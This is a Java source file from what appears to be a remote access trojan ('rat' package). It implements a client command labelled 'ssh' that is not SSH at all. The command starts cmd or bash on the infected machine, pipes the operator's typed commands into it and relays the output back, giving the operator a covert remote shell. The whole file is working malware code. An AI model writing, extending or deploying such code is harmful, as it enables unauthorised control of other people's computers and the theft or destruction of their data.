package main.java.rat.command.clientCommands;

import main.java.rat.command.ClientCommand;
import main.java.rat.command.SessionCommand;

import java.io.*;

public class ClientSSHCommand extends ClientCommand implements SessionCommand {

    boolean isInSession = false;
    private Process terminalProcess;
    private PrintWriter terminalWriter;

    @Override
    public String getMainCommandName() {
        return "ssh";
    }

    @Override
    public String getHelpText() {
        return "Start SSH session with the client, use 'exit' to exit";
    }

    @Override
    public String getExtendedHelpText() {
        return getHelpText();
    }

    @Override
    public boolean executeCommand() {

        logger.log("Entered SSH session. Use 'exit' to exit the session");
        try {
            boolean isWindows = System.getProperty("os.name").toLowerCase().contains("win");
            String process = isWindows ? "cmd" : "bash";

            ProcessBuilder pb = new ProcessBuilder(process);
            pb.redirectErrorStream(true);

            terminalProcess = pb.start();
            terminalWriter = new PrintWriter(terminalProcess.getOutputStream());

            listenToProcess();
            isInSession = true;
            environment.state.setInSession(true);
        } catch (IOException e) {
            e.printStackTrace();
        }

        return true;
    }

    private void listenToProcess() {
        new Thread(() -> {
            BufferedReader processStream = new BufferedReader(
                    new InputStreamReader(terminalProcess.getInputStream())
            );

            while(isInSession) {
                try {
                    String line;
                    while((line = processStream.readLine()) != null) {
                        logger.log(line);
                    }
                } catch (IOException e) {
                    e.printStackTrace();
                }
            }

            try {
                processStream.close();
            } catch (IOException ignored) {}
        }).start();
    }

    @Override
    public String getExitString() {
        return "exit";
    }

    @Override
    public void receivedInput(String command) {
        terminalWriter.println(command+"\n");
        terminalWriter.flush();
    }

    @Override
    public boolean isInSession() {
        return isInSession;
    }

    @Override
    public void exit() {
        isInSession = false;
        environment.state.setInSession(false);
        logger.log("Exiting ssh...");
    }
}
